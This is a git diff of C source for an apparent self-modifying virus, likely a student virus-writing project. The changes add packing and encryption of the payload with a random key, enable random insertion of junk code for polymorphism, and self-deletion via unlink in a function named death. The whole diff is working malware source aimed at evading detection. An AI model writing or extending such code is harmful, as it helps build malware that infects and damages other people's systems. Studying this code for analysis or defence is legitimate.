@@ -10,10 +10,14 @@
 
 extern void __attribute__((naked)) _start(void);
 extern void end(void);
-extern int64_t g_key;
+extern bool g_is_encrypted;
+//extern int64_t g_key;
+extern uint8_t g_key[KEY_SIZE];
 extern void real_start(void);
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
+#define PAYLOAD_SIZE (uintptr_t)&end - (uintptr_t)&real_start
+#define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 size_t __attribute__((section(".text#"))) g_nb_junk = 0;
@@ -204,8 +208,7 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 				if (IS_UNSET(marker, CALL_FLAG)) {
 
 					nop[offset] = 0xE8;
-					//void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
-					void (*tab[])(void) = {junk_pestilence};
+					void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
 					int size = sizeof(tab) / sizeof(tab[0]);
 
 					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
@@ -276,7 +279,7 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 	}
 }
 
-static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, int64_t key) {
+static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, uint8_t *key) {
 
 	uint16_t dummy_offset	= (uintptr_t)&real_start - (uintptr_t)&_start;
 
@@ -293,7 +296,7 @@ static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, int64_t key) {
 	}
 }
 
-static int make_writeable(uint8_t *self, size_t size) {
+int make_writeable(uint8_t *self, size_t size) {
 	uintptr_t start = (uintptr_t)self;
 	uintptr_t end = start + size; JUNK;
 
@@ -329,7 +332,7 @@ void mutate(void) {
 }
 
 /* this is used only for the first run of the main prog (like fill_offsets) */
-static void write_self_pos(uint8_t *entry) {
+static uint8_t* write_self_pos(uint8_t *entry) {
 
 	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
 	uint8_t *junk = (uint8_t *)(entry + junk_pos);
@@ -338,22 +341,36 @@ static void write_self_pos(uint8_t *entry) {
 	uintptr_t junk_size = (uintptr_t)&g_nb_junk - (uintptr_t)&_start;
 	uint8_t *size = (uint8_t *)(entry + junk_size);
 	ft_memcpy(size, &g_nb_junk, sizeof(g_nb_junk));
+
+	/* encrypt self */
+	uintptr_t key_pos = (uintptr_t)&g_key - (uintptr_t)&_start;
+	uint8_t *key = (uint8_t *)(entry + key_pos);
+	getrandom(g_key, KEY_SIZE, 0);
+	ft_memcpy(key, g_key, KEY_SIZE);
+
+	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
+
+	uintptr_t is_encrypted = (uintptr_t)&g_is_encrypted - (uintptr_t)&_start;
+	uint8_t *enc = (uint8_t *)(entry + is_encrypted);
+	ft_memcpy(enc, (const void *)&(bool){true}, sizeof(bool));
+
+	return key;
 }
 
-int death(int start_offset, int64_t key, file_t *file) { JUNK;
+int death(int start_offset, uint8_t *key, file_t *file, bool is_encrypted) {
 
 	uint8_t *self = (uint8_t *)file->view.data; JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
-	bool is_encrypted = (start_offset != 0x1000) ? true : false;
 
 	uint8_t *entry = self + start_offset;
 
 	if (is_encrypted) {
 		replace_nop_encrypt(entry, g_junk_offsets, key);
 	} else {
-		write_self_pos(entry);
-		replace_nop(entry, g_junk_offsets);
+		uint8_t* new_key = write_self_pos(entry);
+		replace_nop_encrypt(entry, g_junk_offsets, new_key);
+		//replace_nop(entry, g_junk_offsets);
 	}
 
 	if (unlink(self_name) == -1) {
